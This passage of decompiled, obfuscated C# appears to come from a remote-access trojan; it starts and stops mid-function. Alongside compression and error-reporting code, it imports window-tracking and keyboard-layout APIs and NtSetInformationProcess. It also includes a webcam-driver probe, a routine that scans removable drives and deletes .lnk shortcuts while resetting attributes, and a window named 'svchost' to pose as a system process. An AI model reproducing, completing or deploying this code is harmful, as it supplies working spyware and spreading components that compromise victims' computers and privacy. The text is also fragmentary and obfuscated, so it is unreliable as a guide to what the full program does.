		{
			class23_0.byte_0[class23_0.int_1++] = (byte)class23_0.uint_0;
			if (class23_0.int_2 > 8)
			{
				class23_0.byte_0[class23_0.int_1++] = (byte)(class23_0.uint_0 >> 8);
			}
		}
		class23_0.uint_0 = 0u;
		class23_0.int_2 = 0;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern IntPtr GetForegroundWindow();

	static string smethod_30(Class1 class1_0)
	{
		string result;
		try
		{
			result = class1_0.clock_0.get_LocalTime().ToString(new string(new char[8] { 'y', 'y', '/', 'M', 'M', '/', 'd', 'd' }));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			result = new string(new char[8] { '?', '?', '/', '?', '?', '/', '?', '?' });
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static void smethod_31(Class13.Class20 class20_0, int int_0)
	{
		Class24.smethod_109(class20_0.class21_2);
		Class24.smethod_109(class20_0.class21_0);
		Class24.smethod_109(class20_0.class21_1);
		Class24.smethod_188(class20_0.class23_0, class20_0.class21_0.int_1 - 257, 5);
		Class24.smethod_188(class20_0.class23_0, class20_0.class21_1.int_1 - 1, 5);
		Class24.smethod_188(class20_0.class23_0, int_0 - 4, 4);
		for (int i = 0; i < int_0; i++)
		{
			Class24.smethod_188(class20_0.class23_0, (int)class20_0.class21_2.byte_0[Class13.Class20.int_0[i]], 3);
		}
		Class13.Class20.Class21 class21_ = class20_0.class21_0;
		Class13.Class20.Class21 class21_2 = class20_0.class21_2;
		Class24.smethod_79(class21_2, class21_);
		class21_ = class20_0.class21_1;
		class21_2 = class20_0.class21_2;
		Class24.smethod_79(class21_2, class21_);
	}

	static string smethod_32(Class0 class0_0, ref byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	static string smethod_33()
	{
		return "SmartAssembly" + " " + Class24.smethod_93();
	}

	unsafe static void smethod_34(Class13.Class22 class22_0)
	{
		void* ptr = stackalloc byte[16];
		Array.Copy(class22_0.byte_0, 32768, class22_0.byte_0, 0, 32768);
		class22_0.int_1 -= 32768;
		class22_0.int_4 -= 32768;
		class22_0.int_3 -= 32768;
		*(int*)ptr = 0;
		while (*(int*)ptr < 32768)
		{
			*(int*)((byte*)ptr + 4) = class22_0.short_0[*(int*)ptr] & 0xFFFF;
			class22_0.short_0[*(int*)ptr] = (short)((*(int*)((byte*)ptr + 4) >= 32768) ? (*(int*)((byte*)ptr + 4) - 32768) : 0);
			(*(int*)ptr)++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < 32768)
		{
			*(int*)((byte*)ptr + 12) = class22_0.short_1[*(int*)((byte*)ptr + 8)] & 0xFFFF;
			class22_0.short_1[*(int*)((byte*)ptr + 8)] = (short)((*(int*)((byte*)ptr + 12) >= 32768) ? (*(int*)((byte*)ptr + 12) - 32768) : 0);
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	unsafe static Icon smethod_35()
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		*(int*)((byte*)ptr + 8) = Class24.ExtractIconEx(Application.get_ExecutablePath(), -1, ref *(int*)((byte*)ptr + 4), ref *(int*)((byte*)ptr + 4), 1);
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Class24.ExtractIconEx(Application.get_ExecutablePath(), 0, ref *(int*)ptr, ref *(int*)((byte*)ptr + 4), 1);
			if (*(int*)ptr != 0)
			{
				return Icon.FromHandle(new IntPtr(*(int*)ptr));
			}
		}
		return null;
	}

	static int smethod_36(Class13.Class15 class15_0)
	{
		return class15_0.int_1 - class15_0.int_0 + (class15_0.int_2 >> 3);
	}

	unsafe static bool smethod_37(int int_0, int int_1, Class13.Class20 class20_0)
	{
		void* ptr = stackalloc byte[9];
		class20_0.short_0[class20_0.int_1] = (short)int_1;
		class20_0.byte_1[class20_0.int_1++] = (byte)(int_0 - 3);
		*(int*)ptr = Class24.smethod_11(int_0 - 3, class20_0);
		short[] short_;
		short[] array = (short_ = class20_0.class21_0.short_0);
		int num = *(int*)ptr;
		nint num2 = num;
		array[num] = (short)(short_[num2] + 1);
		if (*(int*)ptr >= 265 && *(int*)ptr < 285)
		{
			class20_0.int_2 += (*(int*)ptr - 261) / 4;
		}
		*(int*)((byte*)ptr + 4) = Class24.smethod_185(class20_0, int_1 - 1);
		short[] array2 = (short_ = class20_0.class21_1.short_0);
		int num3 = *(int*)((byte*)ptr + 4);
		num2 = num3;
		array2[num3] = (short)(short_[num2] + 1);
		if (*(int*)((byte*)ptr + 4) >= 4)
		{
			class20_0.int_2 += *(int*)((byte*)ptr + 4) / 2 - 1;
		}
		((byte*)ptr)[8] = (Class24.smethod_53(class20_0) ? ((byte)1) : ((byte)0));
		return ((byte*)ptr)[8] != 0;
	}

	static void smethod_38(int int_0, int int_1, byte[] byte_0, Class13.Class15 class15_0)
	{
		if (class15_0.int_0 < class15_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_0 + int_1;
		if (0 <= int_0 && int_0 <= num && num <= byte_0.Length)
		{
			if (((uint)int_1 & (true ? 1u : 0u)) != 0)
			{
				class15_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class15_0.int_2);
				class15_0.int_2 += 8;
			}
			class15_0.byte_0 = byte_0;
			class15_0.int_0 = int_0;
			class15_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static string smethod_39(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.string_0;
	}

	static bool smethod_40(Class28 class28_0, string string_0)
	{
		try
		{
			byte[] byte_ = class28_0.method_4();
			byte[] byte_2;
			try
			{
				byte_2 = Class24.smethod_121(byte_);
			}
			catch
			{
				byte_2 = null;
			}
			byte[] array = Class24.smethod_200(byte_2, "<RSAKeyValue><Modulus>tJTaPkUuXySN2HBS3kjfZimXWx3CsJ531R/oEkkDIJwzesSbVV2BI6MJhgONwRwX8Up6057KqMJzZ1ckslRXWv8Li1bBgmKhKxS5zW83gVP06MHAdfKvDC81miy2DU+6TqYLf29vtVHXyS3jllS1MtRI7woNKpdGciea7xXnERk=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
			FileStream fileStream = File.OpenWrite(string_0);
			byte[] bytes = Encoding.ASCII.GetBytes("{8101C3F8-A792-4EB9-952B-26F7AB9A4B5A}");
			fileStream.Write(bytes, 0, bytes.Length);
			fileStream.Write(array, 0, array.Length);
			fileStream.Close();
			return true;
		}
		catch (ThreadAbortException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	unsafe static bool smethod_41(Class0 class0_0)
	{
		void* ptr = stackalloc byte[6];
		try
		{
			string string_ = Strings.Space(100);
			*(int*)ptr = 0;
			while (true)
			{
				checked
				{
					short short_ = (short)(*unchecked((int*)ptr));
					string string_2 = null;
					if (!Class24.capGetDriverDescriptionA(short_, ref string_, 100, ref string_2, 100))
					{
						(*unchecked((int*)ptr))++;
						if (*unchecked((int*)ptr) <= 4)
						{
							continue;
						}
						goto IL_0048;
					}
				}
				((byte*)ptr)[4] = 1;
				break;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
			goto IL_0048;
		}
		((byte*)ptr)[5] = ((byte*)ptr)[4];
		goto IL_0059;
		IL_0048:
		((byte*)ptr)[5] = 0;
		goto IL_0059;
		IL_0059:
		return ((byte*)ptr)[5] != 0;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetKeyboardLayout(int int_0);

	static bool smethod_42()
	{
		try
		{
			return Class24.GetSystemMetrics(89) != 0;
		}
		catch
		{
			return false;
		}
	}

	static void smethod_43(int int_0, Class13.Class20 class20_0, byte[] byte_0, int int_1, bool bool_0)
	{
		Class24.smethod_188(class20_0.class23_0, bool_0 ? 1 : 0, 3);
		Class24.smethod_29(class20_0.class23_0);
		Class24.smethod_104(class20_0.class23_0, int_0);
		Class24.smethod_104(class20_0.class23_0, ~int_0);
		Class24.smethod_165(int_1, byte_0, int_0, class20_0.class23_0);
		Class24.smethod_17(class20_0);
	}

	[DllImport("ntdll")]
	static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

	unsafe static void smethod_44(Class13.Class20.Class21 class21_0, int[] int_0)
	{
		void* ptr = stackalloc byte[36];
		class21_0.byte_0 = new byte[class21_0.short_0.Length];
		*(int*)ptr = int_0.Length / 2;
		*(int*)((byte*)ptr + 4) = (*(int*)ptr + 1) / 2;
		*(int*)((byte*)ptr + 8) = 0;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class21_0.int_3)
		{
			class21_0.int_2[*(int*)((byte*)ptr + 12)] = 0;
			(*(int*)((byte*)ptr + 12))++;
		}
		int[] array = new int[*(int*)ptr];
		array[*(int*)ptr - 1] = 0;
		*(int*)((byte*)ptr + 16) = *(int*)ptr - 1;
		int[] int_;
		nint num2;
		while (*(int*)((byte*)ptr + 16) >= 0)
		{
			if (int_0[2 * *(int*)((byte*)ptr + 16) + 1] != -1)
			{
				*(int*)((byte*)ptr + 20) = array[*(int*)((byte*)ptr + 16)] + 1;
				if (*(int*)((byte*)ptr + 20) > class21_0.int_3)
				{
					*(int*)((byte*)ptr + 20) = class21_0.int_3;
					(*(int*)((byte*)ptr + 8))++;
				}
				array[int_0[2 * *(int*)((byte*)ptr + 16)]] = (array[int_0[2 * *(int*)((byte*)ptr + 16) + 1]] = *(int*)((byte*)ptr + 20));
			}
			else
			{
				*(int*)((byte*)ptr + 24) = array[*(int*)((byte*)ptr + 16)];
				int[] array2 = (int_ = class21_0.int_2);
				int num = *(int*)((byte*)ptr + 24) - 1;
				num2 = num;
				array2[num] = int_[num2] + 1;
				class21_0.byte_0[int_0[2 * *(int*)((byte*)ptr + 16)]] = (byte)array[*(int*)((byte*)ptr + 16)];
			}
			(*(int*)((byte*)ptr + 16))--;
		}
		if (*(int*)((byte*)ptr + 8) == 0)
		{
			return;
		}
		int num3 = class21_0.int_3 - 1;
		while (true)
		{
			if (class21_0.int_2[--num3] != 0)
			{
				do
				{
					int[] array3 = (int_ = class21_0.int_2);
					int num4 = num3;
					num2 = num4;
					array3[num4] = int_[num2] - 1;
					int[] array4 = (int_ = class21_0.int_2);
					int num5 = ++num3;
					num2 = num5;
					array4[num5] = int_[num2] + 1;
					*(int*)((byte*)ptr + 8) -= 1 << class21_0.int_3 - 1 - num3;
				}
				while (*(int*)((byte*)ptr + 8) > 0 && num3 < class21_0.int_3 - 1);
				if (*(int*)((byte*)ptr + 8) <= 0)
				{
					break;
				}
			}
		}
		int[] array5 = (int_ = class21_0.int_2);
		int num6 = class21_0.int_3 - 1;
		num2 = num6;
		array5[num6] = int_[num2] + *(int*)((byte*)ptr + 8);
		int[] array6 = (int_ = class21_0.int_2);
		int num7 = class21_0.int_3 - 2;
		num2 = num7;
		array6[num7] = int_[num2] - *(int*)((byte*)ptr + 8);
		int num8 = 2 * *(int*)((byte*)ptr + 4);
		*(int*)((byte*)ptr + 28) = class21_0.int_3;
		while (*(int*)((byte*)ptr + 28) != 0)
		{
			*(int*)((byte*)ptr + 32) = class21_0.int_2[*(int*)((byte*)ptr + 28) - 1];
			while (*(int*)((byte*)ptr + 32) > 0)
			{
				int num9 = 2 * int_0[num8++];
				if (int_0[num9 + 1] == -1)
				{
					class21_0.byte_0[int_0[num9]] = (byte)(*(uint*)((byte*)ptr + 28));
					(*(int*)((byte*)ptr + 32))--;
				}
			}
			(*(int*)((byte*)ptr + 28))--;
		}
	}

	static string smethod_45(uint uint_0, Class0 class0_0)
	{
		string result;
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			int localeInfo = Class24.GetLocaleInfo(1024u, uint_0, stringBuilder, stringBuilder.Capacity);
			if (localeInfo > 0)
			{
				result = stringBuilder.ToString().Substring(0, checked(localeInfo - 1));
				goto IL_005d;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		return new string(new char[1] { 'X' });
		IL_005d:
		return result;
	}

	static void smethod_46(Class13.Class20.Class21 class21_0, int int_0)
	{
		Class24.smethod_188(class21_0.class20_0.class23_0, class21_0.short_1[int_0] & 0xFFFF, (int)class21_0.byte_0[int_0]);
	}

	static void smethod_47(Class13.Class15 class15_0)
	{
		class15_0.uint_0 >>= class15_0.int_2 & 7;
		class15_0.int_2 &= -8;
	}

	static void smethod_48(Form0 form0_0)
	{
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		((Control)form0_0.panel_0).SuspendLayout();
		((Control)form0_0.panel_1).SuspendLayout();
		((Control)form0_0).SuspendLayout();
		Class24.smethod_113(form0_0.control1_0, Enum1.const_1);
		Class24.smethod_113(form0_0.control1_1, Enum1.const_1);
		((Control)form0_0.checkBox_0).set_Anchor((AnchorStyles)6);
		((ButtonBase)form0_0.checkBox_0).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.checkBox_0).set_Location(new Point(22, 98));
		((Control)form0_0.checkBox_0).set_Size(new Size(226, 16));
		((Control)form0_0.checkBox_0).set_TabIndex(13);
		((Control)form0_0.checkBox_0).set_Text("Ignore this error and attempt to &continue.");
		form0_0.checkBox_0.add_CheckedChanged((EventHandler)form0_0.method_5);
		((Control)form0_0.label_0).set_Anchor((AnchorStyles)14);
		form0_0.label_0.set_FlatStyle((FlatStyle)3);
		((Control)form0_0.label_0).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)form0_0.label_0).set_Location(new Point(20, 124));
		((Control)form0_0.label_0).set_Size(new Size(381, 16));
		((Control)form0_0.label_0).set_Text(string.Format("Please tell {0} about this problem.", "[Unknown company]"));
		((Control)form0_0.button_0).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_0).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_0).set_Size(new Size(75, 24));
		((Control)form0_0.button_0).set_Location(new Point(400 - ((Control)form0_0.button_0).get_Width(), 205));
		((Control)form0_0.button_0).set_TabIndex(4);
		((Control)form0_0.button_0).set_Text("&Don't Send");
		((Control)form0_0.button_0).add_Click((EventHandler)form0_0.method_2);
		((Control)form0_0.button_1).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_1).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_1).set_Size(new Size(105, 24));
		((Control)form0_0.button_1).set_Location(new Point(((Control)form0_0.button_0).get_Left() - ((Control)form0_0.button_1).get_Width() - 6, 205));
		((Control)form0_0.button_1).set_TabIndex(3);
		((Control)form0_0.button_1).set_Text("&Send Error Report");
		((Control)form0_0.button_1).add_Click((EventHandler)form0_0.method_1);
		((Control)form0_0.button_6).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_6).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_6).set_Size(new Size(64, 24));
		((Control)form0_0.button_6).set_Location(new Point(((Control)form0_0.button_1).get_Left() - ((Control)form0_0.button_6).get_Width() - 6, 205));
		((Control)form0_0.button_6).set_TabIndex(14);
		((Control)form0_0.button_6).set_Text("De&bug");
		((Control)form0_0.button_6).set_Visible(false);
		((Control)form0_0.button_6).add_Click((EventHandler)form0_0.method_12);
		((Control)form0_0.label_1).set_Anchor((AnchorStyles)14);
		form0_0.label_1.set_FlatStyle((FlatStyle)3);
		((Control)form0_0.label_1).set_Location(new Point(20, 140));
		((Control)form0_0.label_1).set_Size(new Size(381, 55));
		((Control)form0_0.label_1).set_Text(string.Format("To help improve the software you use, {0} is interested in learning more about this error. We have created a report about the error for you to send to us.", "[Unknown company]"));
		((Control)form0_0.class35_0).set_Anchor((AnchorStyles)13);
		((Control)form0_0.class35_0).set_Location(new Point(20, 69));
		((Control)form0_0.class35_0).set_Size(new Size(381, 13));
		((Control)form0_0.button_2).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_2).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_2).set_Size(new Size(80, 24));
		((Control)form0_0.button_2).set_Location(new Point(400 - ((Control)form0_0.button_2).get_Width(), 205));
		((Control)form0_0.button_2).set_TabIndex(7);
		((Control)form0_0.button_2).set_Text("&Cancel");
		((Control)form0_0.button_2).add_Click((EventHandler)form0_0.method_3);
		((Control)form0_0.button_3).set_Anchor((AnchorStyles)10);
		((Control)form0_0.button_3).set_Enabled(false);
		((ButtonBase)form0_0.button_3).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_3).set_Size(new Size(105, 24));
		((Control)form0_0.button_3).set_Location(new Point(((Control)form0_0.button_2).get_Left() - ((Control)form0_0.button_3).get_Width() - 6, 205));
		((Control)form0_0.button_3).set_TabIndex(6);
		((Control)form0_0.button_3).set_Text("&OK");
		((Control)form0_0.button_3).add_Click((EventHandler)form0_0.method_4);
		((Control)form0_0.button_4).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_4).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_4).set_Location(((Control)form0_0.button_3).get_Location());
		((Control)form0_0.button_4).set_Size(((Control)form0_0.button_3).get_Size());
		((Control)form0_0.button_4).set_TabIndex(5);
		((Control)form0_0.button_4).set_Text("&Retry");
		((Control)form0_0.button_4).set_Visible(false);
		((Control)form0_0.button_4).add_Click((EventHandler)form0_0.method_10);
		((Control)form0_0.button_5).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_5).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_5).set_Location(((Control)form0_0.button_3).get_Location());
		((Control)form0_0.button_5).set_Size(((Control)form0_0.button_3).get_Size());
		((Control)form0_0.button_5).set_TabIndex(5);
		((Control)form0_0.button_5).set_Text("Save Report");
		((Control)form0_0.button_5).set_Visible(false);
		((Control)form0_0.button_5).add_Click((EventHandler)form0_0.method_0);
		((Control)form0_0.control3_0).set_Location(new Point(87, 146));
		((Control)form0_0.control3_0).set_Visible(false);
		((Control)form0_0.control0_0).SetBounds(24, 72, 368, 16);
		((Control)form0_0.control0_1).SetBounds(24, 96, 368, 16);
		((Control)form0_0.control0_2).SetBounds(24, 120, 368, 16);
		((Control)form0_0.control0_3).SetBounds(24, 144, 368, 16);
		((Control)form0_0.control2_0).set_Anchor((AnchorStyles)6);
		((Control)form0_0.control2_0).SetBounds(20, 444, 120, 32);
		((Control)form0_0.panel_0).get_Controls().AddRange((Control[])(object)new Control[8]
		{
			(Control)form0_0.button_6,
			(Control)form0_0.checkBox_0,
			(Control)form0_0.label_0,
			(Control)form0_0.button_0,
			(Control)form0_0.button_1,
			(Control)form0_0.label_1,
			(Control)form0_0.class35_0,
			form0_0.control1_0
		});
		((Control)form0_0.panel_0).set_Size(new Size(413, 240));
		((Control)form0_0.panel_0).set_TabIndex(0);
		((Control)form0_0.panel_1).get_Controls().AddRange((Control[])(object)new Control[10]
		{
			(Control)form0_0.button_2,
			(Control)form0_0.button_3,
			(Control)form0_0.button_4,
			(Control)form0_0.button_5,
			form0_0.control3_0,
			form0_0.control1_1,
			form0_0.control0_0,
			form0_0.control0_1,
			form0_0.control0_2,
			form0_0.control0_3
		});
		((Control)form0_0.panel_1).set_Size(new Size(413, 240));
		((Control)form0_0.panel_1).set_TabIndex(2);
		((Control)form0_0.panel_1).set_Visible(false);
		((Form)form0_0).set_AutoScaleBaseSize(new Size(5, 13));
		((Form)form0_0).set_ClientSize(new Size(434, 488));
		((Form)form0_0).set_ControlBox(false);
		((Control)form0_0).get_Controls().AddRange((Control[])(object)new Control[3]
		{
			form0_0.control2_0,
			(Control)form0_0.panel_0,
			(Control)form0_0.panel_1
		});
		((Form)form0_0).set_FormBorderStyle((FormBorderStyle)1);
		((Form)form0_0).set_ShowInTaskbar(false);
		((Form)form0_0).set_MinimizeBox(false);
		((Form)form0_0).set_MaximizeBox(false);
		((Form)form0_0).set_StartPosition((FormStartPosition)1);
		((Control)form0_0).set_Text("svchost");
		if (((Control)form0_0).get_Text().Length == 0)
		{
			((Control)form0_0).set_Text("Error Reporting");
		}
		try
		{
			((Form)form0_0).set_TopMost(true);
		}
		catch
		{
		}
		((Control)form0_0.panel_0).ResumeLayout(false);
		((Control)form0_0.panel_1).ResumeLayout(false);
		((Control)form0_0).ResumeLayout(false);
		((Control)form0_0.button_4).BringToFront();
		((Control)form0_0.button_5).BringToFront();
		((Form)form0_0).set_Size(new Size(419, 264));
		((Control)form0_0.panel_1).set_Dock((DockStyle)5);
		((Control)form0_0.panel_0).set_Dock((DockStyle)5);
	}

	static void smethod_49(bool bool_0, EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_3 = bool_0;
	}

	unsafe static int smethod_50(Class13.Class16 class16_0, Class13.Class15 class15_0, int int_0)
	{
		void* ptr = stackalloc byte[12];
		int_0 = Math.Min(Math.Min(int_0, 32768 - class16_0.int_1), Class24.smethod_36(class15_0));
		*(int*)((byte*)ptr + 4) = 32768 - class16_0.int_0;
		if (int_0 > *(int*)((byte*)ptr + 4))
		{
			*(int*)ptr = Class24.smethod_189(class15_0, class16_0.byte_0, class16_0.int_0, *(int*)((byte*)ptr + 4));
			if (*(int*)ptr == *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr += Class24.smethod_189(class15_0, class16_0.byte_0, 0, int_0 - *(int*)((byte*)ptr + 4));
			}
		}
		else
		{
			*(int*)ptr = Class24.smethod_189(class15_0, class16_0.byte_0, class16_0.int_0, int_0);
		}
		class16_0.int_0 = (class16_0.int_0 + *(int*)ptr) & 0x7FFF;
		class16_0.int_1 += *(int*)ptr;
		*(int*)((byte*)ptr + 8) = *(int*)ptr;
		return *(int*)((byte*)ptr + 8);
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_0);

	unsafe static int smethod_51(Class13.Class17 class17_0, Class13.Class15 class15_0)
	{
		void* ptr = stackalloc byte[20];
		int num;
		if ((num = Class24.smethod_125(class15_0, 9)) >= 0)
		{
			int num2;
			if ((num2 = class17_0.short_0[num]) >= 0)
			{
				Class24.smethod_145(class15_0, num2 & 0xF);
				*(int*)((byte*)ptr + 16) = num2 >> 4;
			}
			else
			{
				*(int*)ptr = -(num2 >> 4);
				*(int*)((byte*)ptr + 4) = num2 & 0xF;
				if ((num = Class24.smethod_125(class15_0, *(int*)((byte*)ptr + 4))) >= 0)
				{
					num2 = class17_0.short_0[*(int*)ptr | (num >> 9)];
					Class24.smethod_145(class15_0, num2 & 0xF);
					*(int*)((byte*)ptr + 16) = num2 >> 4;
				}
				else
				{
					*(int*)((byte*)ptr + 8) = Class24.smethod_77(class15_0);
					num = Class24.smethod_125(class15_0, *(int*)((byte*)ptr + 8));
					num2 = class17_0.short_0[*(int*)ptr | (num >> 9)];
					if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
					{
						Class24.smethod_145(class15_0, num2 & 0xF);
						*(int*)((byte*)ptr + 16) = num2 >> 4;
					}
					else
					{
						*(int*)((byte*)ptr + 16) = -1;
					}
				}
			}
		}
		else
		{
			*(int*)((byte*)ptr + 12) = Class24.smethod_77(class15_0);
			num = Class24.smethod_125(class15_0, *(int*)((byte*)ptr + 12));
			int num2 = class17_0.short_0[num];
			if (num2 >= 0 && (num2 & 0xF) <= *(int*)((byte*)ptr + 12))
			{
				Class24.smethod_145(class15_0, num2 & 0xF);
				*(int*)((byte*)ptr + 16) = num2 >> 4;
			}
			else
			{
				*(int*)((byte*)ptr + 16) = -1;
			}
		}
		return *(int*)((byte*)ptr + 16);
	}

	static void smethod_52(string string_0, string string_1, Class38 class38_0, Delegate3 delegate3_0, byte[] byte_0, string string_2)
	{
		try
		{
			ReportingService reportingService = new ReportingService(class38_0.string_2);
			if (class38_0.iwebProxy_0 != null)
			{
				((HttpWebClientProtocol)reportingService).set_Proxy(class38_0.iwebProxy_0);
			}
			delegate3_0(reportingService.UploadReport2(class38_0.string_1, byte_0, string_0, string_1, string_2));
		}
		catch (Exception ex)
		{
			delegate3_0("ERR 2002: " + ex.Message);
		}
	}

	static bool smethod_53(Class13.Class20 class20_0)
	{
		return class20_0.int_1 >= 16384;
	}

	static bool smethod_54()
	{
		return Class24.smethod_25().byte_0 == 1;
	}

	static string smethod_55()
	{
		try
		{
			return Application.get_ExecutablePath();
		}
		catch
		{
			return "N/A";
		}
	}

	unsafe static void smethod_56(Class2 class2_0)
	{
		void* ptr = stackalloc byte[12];
		class2_0.bool_0 = true;
		while (class2_0.thread_0 != null)
		{
			Thread.Sleep(1);
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		*(int*)ptr = 0;
		while (*(int*)ptr < drives.Length)
		{
			DriveInfo driveInfo = drives[*(int*)ptr];
			try
			{
				if (driveInfo.IsReady && ((driveInfo.DriveType == DriveType.Removable) | (driveInfo.DriveType == DriveType.CDRom)))
				{
					if (File.Exists(driveInfo.Name + class2_0.string_0))
					{
						File.SetAttributes(driveInfo.Name + class2_0.string_0, FileAttributes.Normal);
						File.Delete(driveInfo.Name + class2_0.string_0);
					}
					string[] files = Directory.GetFiles(driveInfo.Name);
					*(int*)((byte*)ptr + 4) = 0;
					while (*(int*)((byte*)ptr + 4) < files.Length)
					{
						string text = files[*(int*)((byte*)ptr + 4)];
						try
						{
							File.SetAttributes(text, FileAttributes.Normal);
							if (text.ToLower().EndsWith(".lnk"))
							{
								File.Delete(text);
							}
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							ProjectData.ClearProjectError();
						}
						checked
						{
							(*unchecked((int*)((byte*)ptr + 4)))++;
						}
					}
					string[] directories = Directory.GetDirectories(driveInfo.Name);
					*(int*)((byte*)ptr + 8) = 0;
					while (*(int*)((byte*)ptr + 8) < directories.Length)
					{
						string path = directories[*(int*)((byte*)ptr + 8)];
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(path);
							directoryInfo.Attributes = FileAttributes.Normal;
							directoryInfo = null;
						}
						catch (Exception ex3)
						{
							ProjectData.SetProjectError(ex3);
							Exception ex4 = ex3;
							ProjectData.ClearProjectError();
						}
						checked
						{
							(*unchecked((int*)((byte*)ptr + 8)))++;
						}
					}
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
			checked
			{
				(*unchecked((int*)ptr))++;
			}
		}
	}

	static int smethod_57(Font font_0, Graphics graphics_0, int int_0, string string_0)
	{
		Class39.Struct18 struct18_ = new Class39.Struct18(new Rectangle(0, 0, int_0, 10000));
		IntPtr hdc = graphics_0.GetHdc();
		IntPtr intptr_ = font_0.ToHfont();
		IntPtr intptr_2 = Class24.SelectObject(hdc, intptr_);
		Class24.DrawText(hdc, string_0, -1, ref struct18_, 3088);
		Class24.SelectObject(hdc, intptr_2);
		graphics_0.ReleaseHdc(hdc);
		return struct18_.int_3 - struct18_.int_1;
	}

	static void smethod_58(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_0 = true;
	}

	static string smethod_59(string string_0)
	{
		if (string_0.StartsWith("\"<RSAKeyValue>") && string_0.EndsWith("</RSAKeyValue>\""))
		{
			return "*** Information not reported for security reasons ***";
		}
		return string_0;
	}

	static void smethod_60(Class36 class36_0, Delegate2 delegate2_0)
	{
		Delegate2 @delegate = class36_0.delegate2_0;
		Delegate2 delegate2;
		do
		{
			delegate2 = @delegate;
			Delegate2 value = (Delegate2)Delegate.Combine(delegate2, delegate2_0);
			@delegate = Interlocked.CompareExchange(ref class36_0.delegate2_0, value, delegate2);
		}
		while ((object)@delegate != delegate2);
	}

	static int smethod_61(Class28 class28_0, Class28.Struct17 struct17_0)
	{
		string key = struct17_0.struct16_0.string_0.ToUpper();
		if (class28_0.dictionary_3.ContainsKey(key))
		{
			return class28_0.dictionary_3[key];
		}
		int count = class28_0.list_2.Count;
		class28_0.list_2.Add(struct17_0.struct16_0);
		class28_0.dictionary_3.Add(key, count);
		return count;
	}

	static bool smethod_62(Class13.Class15 class15_0)
	{
		return class15_0.int_0 == class15_0.int_1;
	}

	static void smethod_63(Class11 class11_0)
	{
		class11_0.type_0.GetMethod("Clear")!.Invoke(class11_0.object_0, new object[0]);
	}

	static bool smethod_64(EventArgs3 eventArgs3_0)
	{
		return eventArgs3_0.bool_0;
	}

	static void smethod_65(Class28 class28_0, Delegate1 delegate1_0)
	{
		Delegate1 @delegate = class28_0.delegate1_0;
		Delegate1 delegate2;
		do
		{
			delegate2 = @delegate;
			Delegate1 value = (Delegate1)Delegate.Combine(delegate2, delegate1_0);
			@delegate = Interlocked.CompareExchange(ref class28_0.delegate1_0, value, delegate2);
		}
		while ((object)@delegate != delegate2);
	}

	static ICryptoTransform smethod_66(byte[] byte_0, Class11 class11_0, bool bool_0, byte[] byte_1)
	{
		class11_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class11_0.object_0, new object[1] { byte_1 });
		class11_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class11_0.object_0, new object[1] { byte_0 });
		MethodInfo method = class11_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class11_0.object_0, new object[0]);
	}

	static object smethod_67(string string_0, DriveInfo driveInfo_0, Class2 class2_0, string string_1)
	{
		try
		{
			File.Delete(driveInfo_0.Name + new FileInfo(string_1).get_Name() + ".lnk");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
